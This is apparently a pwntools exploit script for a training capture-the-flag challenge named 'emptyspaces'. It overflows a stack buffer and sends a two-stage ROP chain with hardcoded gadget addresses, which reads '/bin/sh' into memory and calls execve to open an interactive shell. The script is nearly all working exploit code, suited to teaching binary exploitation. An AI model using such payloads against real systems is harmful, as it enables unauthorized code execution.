#!/usr/bin/python3

from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
# context.terminal = ['terminator', '--new-tab', '-x']
# context.log_level = 'debug'
HOST = "training.jinblack.it"
PORT = 4006
PROG = "./emptyspaces"
# context.log_level = 'error'
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process(PROG)
    gdb.attach(r,"""
    b* 0x00400c14
    command 1
    x/40gx $rsp
    end
    """)
    input("wait for gdb")
else:
    r = process(PROG)

read_addr = 0x004497b0 #change rdx ?

pop_rax         = 0x00000000004155a4
pop_rdx         = 0x4497c5
pop_rdi         = 0x400696
pop_rsi         = 0x0000000000410133
syscall         = 0x40128c
pop_rdi_syscall = 0x44400d
int_0x80        = 0x4680fa
push_rsp        = 0x0000000000450a84
push_rdi        = 0x00000000004235e5
gadg1           = 0x000000000047fa0c      #mov rbx, rsp ; mov rsi, rbx ; syscall
main            = 0x00400b95
"""
Binary is statically linked, 64 bit, No PIE
There is a buffer overflow
Some parts of the buffer will be replaced with 0xc3f48948

empty(buffer)
buffer is 0x40
read is 0x89
buffer+0x50

bpython
from pwn import *
hex(64)
hex(72)
cyclic(100)
cyclic_find(0x61616173)
cyclic_find(0x61616262)
0x111
"""
r.recvuntil("What shall we use\nTo fill the empty spaces\nWhere we used to pwn?")



payload      = b"A"*72
payload     += p64(pop_rdx)
payload     += p64(0x150)
payload     += p64(pop_rdi)
payload     += p64(0x0)     #stdin
payload     += p64(read_addr)
print(hex(len(payload)))
r.sendline(payload)

sleep(0.001)

payload      = b"D"*len(payload)
payload     += p64(pop_rax)
payload     += p64(0)
payload     += p64(pop_rsi)
payload     += p64(0x006b90e0)
payload     += p64(pop_rdx)
payload     += p64(8)
payload     += p64(pop_rdi)
payload     += p64(0)
payload     += p64(read_addr)

payload     += p64(pop_rax)
payload     += p64(0x3b)
payload     += p64(pop_rsi)
payload     += p64(0)
payload     += p64(pop_rdx)
payload     += p64(0)
payload     += p64(pop_rdi)
payload     += p64(0x006b90e0)
payload     += p64(syscall)

r.sendline(payload)
sleep(0.001)
input("Send binsh...")
r.sendline(b"/bin/sh\x00")

r.interactive()
